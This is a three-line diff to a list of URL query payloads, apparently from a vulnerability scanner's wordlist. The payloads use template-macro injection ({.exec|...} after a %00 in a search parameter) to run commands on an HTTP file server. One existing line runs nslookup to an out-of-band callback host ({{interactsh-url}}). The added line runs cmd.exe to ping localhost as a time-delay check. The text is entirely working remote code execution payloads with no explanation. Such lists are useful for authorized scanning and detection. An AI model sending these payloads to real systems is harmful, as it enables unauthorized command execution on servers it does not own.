@@ -1,2 +1,3 @@
 /?search==%00{.cookie|{{str1}}|value%3d{{str2}}.}
 /?n=%0A&cmd=nslookup+{{interactsh-url}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}
+/?search==%00{.exec|cmd.exe+/c+ping+127.0.0.1+-n+10.}
